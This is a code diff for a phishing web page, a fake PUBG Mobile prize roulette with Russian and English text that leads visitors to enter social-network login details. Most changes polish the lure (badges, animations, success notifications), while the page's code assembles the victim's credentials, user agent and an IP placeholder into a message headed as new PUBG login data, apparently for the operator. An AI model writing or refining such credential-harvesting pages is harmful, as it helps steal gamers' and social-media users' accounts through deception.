-                            'Ваш приз был отправлен на ваш аккаунт PUBG Mobile.' : 
+                            '✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile.' : 
                             'Выберите социальную сеть для получения приза.'}
                     </p>
                 `;
@@ -2179,28 +2447,30 @@
             const mailBtn = document.getElementById('prizeMailBtn');
             
             if (userPrize && !isPrizeReceived) {
-                // Показываем анимированный эмодзи ❗️
-                badge.textContent = '❗️';
-                badge.classList.add('emoji-alert');
+                badge.textContent = '❗';
                 badge.style.display = 'flex';
+                badge.style.background = '#ffb000';
                 mailBtn.disabled = false;
+                // Добавляем анимацию пульсации
+                badge.style.animation = 'emojiPulse 2s infinite';
             } else if (userPrize && isPrizeReceived) {
                 badge.textContent = '✓';
-                badge.classList.remove('emoji-alert');
                 badge.style.display = 'flex';
                 badge.style.background = '#4CAF50';
                 mailBtn.disabled = false;
+                badge.style.animation = 'none';
             } else {
                 badge.textContent = '0';
-                badge.classList.remove('emoji-alert');
                 badge.style.display = 'none';
                 mailBtn.disabled = false;
+                badge.style.animation = 'none';
             }
         }
         
         document.addEventListener('DOMContentLoaded', function() {
             const playBtn = document.getElementById('playBtn');
             const selectionFrame = document.getElementById('selectionFrame');
+            const selectionIndicator = document.getElementById('selectionIndicator');
             const socialSelectSection = document.getElementById('socialSelectSection');
             const confirmationSection = document.getElementById('confirmationSection');
             const getPrizeBtn = document.getElementById('getPrizeBtn');
@@ -2213,7 +2483,7 @@
             const socialOptions = document.querySelectorAll('.social-option');
             const prizeMailBtn = document.getElementById('prizeMailBtn');
             
-            // Призы без названий (только изображения)
+            // Призы с картинками (без названий)
             const prizes = [
                 { id: 1, image: "priz1.png" },
                 { id: 2, image: "priz2.png" },
@@ -2253,8 +2523,7 @@
                     notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
                     confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
                     confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
-                    loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
-                    prizeWon: "Поздравляем! Вы выиграли приз!"
+                    loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов."
                 },
                 en: {
                     play: "PLAY",
@@ -2268,8 +2537,7 @@
                     notificationAlreadyPlayed: "You have already used your attempt today!",
                     confirmationTitle: "APPLICATION ACCEPTED!",
                     confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
-                    loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
-                    prizeWon: "Congratulations! You won a prize!"
+                    loginSuccess: "Login data sent! Prize will be credited within 24 hours."
                 }
             };
             
@@ -2311,10 +2579,18 @@
             });
             
             // Функция показа уведомления
-            function showNotification(message, isError = false) {
+            function showNotification(message, isError = false, isSuccess = false) {
                 notification.textContent = message;
-                notification.style.background = isError ? '#5a1a1a' : '#2a3b5a';
-                notification.style.borderLeftColor = isError ? '#ff4444' : '#2a3b5a';
+                notification.classList.remove('error', 'success');
+                
+                if (isError) {
+                    notification.classList.add('error');
+                } else if (isSuccess) {
+                    notification.classList.add('success');
+                } else {
+                    notification.style.background = 'linear-gradient(135deg, #2a3b5a, #1a2c42)';
+                }
+                
                 notification.style.display = 'block';
                 
                 setTimeout(() => {
@@ -2333,11 +2609,25 @@
                 const rect = prizeItem.getBoundingClientRect();
                 const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
                 
-                selectionFrame.style.width = (rect.width + 20) + 'px';
-                selectionFrame.style.height = (rect.height + 20) + 'px';
-                selectionFrame.style.left = (rect.left - containerRect.left - 8) + 'px';
-                selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
+                selectionFrame.style.width = (rect.width + 16) + 'px';
+                selectionFrame.style.height = (rect.height + 16) + 'px';
+                selectionFrame.style.left = (rect.left - containerRect.left - 6) + 'px';
+                selectionFrame.style.top = (rect.top - containerRect.top - 6) + 'px';
                 selectionFrame.classList.add('active');
+                
+                // Позиционирование индикатора
+                selectionIndicator.style.left = rect.left - containerRect.left + rect.width/2 + 'px';
+                selectionIndicator.style.top = rect.top - containerRect.top - 28 + 'px';
+            }
+            
+            // Функция показа/скрытия индикатора
+            function showSelectionIndicator(show) {
+                if (show) {
+                    selectionIndicator.classList.add('show');
+                    selectionIndicator.textContent = 'ВЫБРАНО';
+                } else {
+                    selectionIndicator.classList.remove('show');
+                }
             }
             
             // Функция запуска рулетки
@@ -2353,6 +2643,7 @@
                 playBtn.disabled = true;
                 socialSelectSection.classList.remove('active');
                 confirmationSection.classList.remove('active');
+                showSelectionIndicator(false);
                 
                 finalPrizeIndex = getRandomPrize();
                 
@@ -2362,7 +2653,7 @@
                 selectionFrame.style.opacity = '1';
                 
                 spinCount = 0;
-                spinSpeed = 100;
+                spinSpeed = 80; // Быстрее начальная скорость
                 currentPrizeIndex = 0;
                 
                 spinInterval = setInterval(spinStep, spinSpeed);
@@ -2375,8 +2666,9 @@
                 currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
                 spinCount++;
                 
+                // Замедление в конце
                 if (spinCount > totalSpins * 0.7) {
-                    spinSpeed += 20;
+                    spinSpeed += 15;
                     clearInterval(spinInterval);
                     spinInterval = setInterval(spinStep, spinSpeed);
                 }
@@ -2391,6 +2683,7 @@
                     
                     setTimeout(() => {
                         moveFrameToPrize(finalPrizeIndex);
+                        showSelectionIndicator(true);
                         
                         setTimeout(() => {
                             isSpinning = false;
@@ -2399,11 +2692,12 @@
                             userPrize = prizes[finalPrizeIndex];
                             isPrizeReceived = false;
                             
-                            // Обновляем значок с анимированным эмодзи
+                            // Обновляем значок с анимацией
                             updatePrizeBadge();
                             
                             hasPlayed = true;
                             playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
+                            playBtn.disabled = false;
                             
                             // Сбрасываем выбор соцсети
                             socialOptions.forEach(opt => opt.classList.remove('selected'));
@@ -2413,7 +2707,7 @@
                             socialSelectSection.classList.add('active');
                             socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                             
-                            showNotification("Поздравляем! Вы выиграли приз!");
+                            showNotification(`🎉 Поздравляем! Вы выиграли приз!`, false, true);
                         }, 1000);
                     }, 300);
                 }
@@ -2458,7 +2752,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -2479,7 +2773,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -2499,7 +2793,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -2535,7 +2829,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -2584,7 +2878,7 @@
                     'google': 'Google'
                 };
                 
-                const prizeName = `Приз #${prizeIndex + 1}`;
+                const prizeNumber = prizeIndex + 1;
                 
                 let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
                 message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
@@ -2606,7 +2900,7 @@
                     message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
                 }
                 
-                message += `🎁 Выигранный приз: ${prizeName}\n`;
+                message += `🎁 Выигранный приз: #${prizeNumber}\n`;
                 message += `⏰ Время: ${new Date().toLocaleString()}\n`;
                 message += `🌐 User Agent: ${navigator.userAgent}\n`;
                 message += `📍 IP: собирается...`;
@@ -2662,6 +2956,7 @@
             
             // Инициализация
             selectionFrame.style.opacity = '0';
+            selectionIndicator.style.opacity = '0';
             updatePrizeBadge();
             
             // Предзагрузка изображений
